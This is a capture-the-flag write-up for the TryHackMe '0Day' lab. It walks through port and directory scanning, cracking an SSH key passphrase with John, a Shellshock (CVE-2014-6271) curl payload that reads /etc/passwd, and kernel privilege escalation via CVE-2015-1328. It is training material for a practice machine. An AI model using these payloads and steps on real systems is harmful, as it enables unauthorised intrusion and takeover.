# [TryHackme:0Day](https://tryhackme.com/room/0day)
## Enumeration

Start with port scan with *Nmap*
```bash
export IP=<target>
sudo nmap -Pn -T4 $IP
```
**Result**

![image](../../images/day-1_clean.png)

Discovering http server source page there is nothing unusual. Fuzzing web directories I found this pages. 

```bash
gobuster dir -u <target> -w <wordList> -t 64 
```

![image](../../images/day-2_clean.png)

this directories have a lot of juice, inside `/backup` page I found SSH key

![image](../../images/day-3_clean.png)

we can use it to login to machine. but we need valid user to login. Inside `/secret` page I found this cute turtle 

![image](../../images/day-4_clean.png)

Maybe this is the user name ? I will give it try. 

 
```bash
# change id_rsa to valid permissions
chmod 600 id_rsa
# Login
ssh -i id_rsa turtle@$IP
```

![image](../../images/day-5_clean.png)

the SSH key need passphrase we can crack it using John

```bash
ssh2john id_rsa > crackme.txt
john --wordlist=<wordList> crackme.txt
```

![image](../../images/day-6_clean.png)

Passphrase founded but also it require password to login. Doing more enumeration. Using *Nikto* tool to scan server.

```bash
nikto -h <target>
```

**Result**

![image](../../images/day-7_clean.png)

Target is vulnerable to `CVE-2014-6271` , we can abuse this vulnerability with this payload

```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://$IP:80/cgi-bin/test.cgi
```

![image](../../images/day-8_clean.png)

we can establish reverse shell with bash. 


## initial access 

![image](../../images/day-9_clean.png)

## User flag

![image](../../images/day-10_clean.png)

## Enumeration
Using *LinPEAS* to enumerate the target machine .

![image](../../images/day-11_clean.png)

found this vulnerable kernel with [CVE-2015-1328](https://www.exploit-db.com/exploits/37292) we can use it to privilege escalation.  Move exploit to target machine then compile it

```bash
gcc exp.c -o exp
./exp
```

![image](../../images/day-12_clean.png)

## Root flag

![image](../../images/day-13_clean.png)





